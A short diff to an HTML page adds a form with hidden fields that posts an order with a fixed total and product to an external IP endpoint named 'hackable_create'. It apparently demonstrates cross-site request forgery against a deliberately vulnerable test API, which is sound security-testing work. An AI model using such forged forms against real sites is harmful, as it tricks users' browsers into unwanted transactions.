@@ -21,5 +21,10 @@ function send() {
 </head>
 <body>
     <input type="button" onclick="send()" value="Send data!">
+    <form method="POST" action="http://81.228.201.233/api/orders.php?action=hackable_create">
+        <input type="hidden" name="total" value="1.2">
+        <input type="hidden" name="products" value="1">
+        <input type="submit" value="send form">
+    </form>
 </body>
 </html>
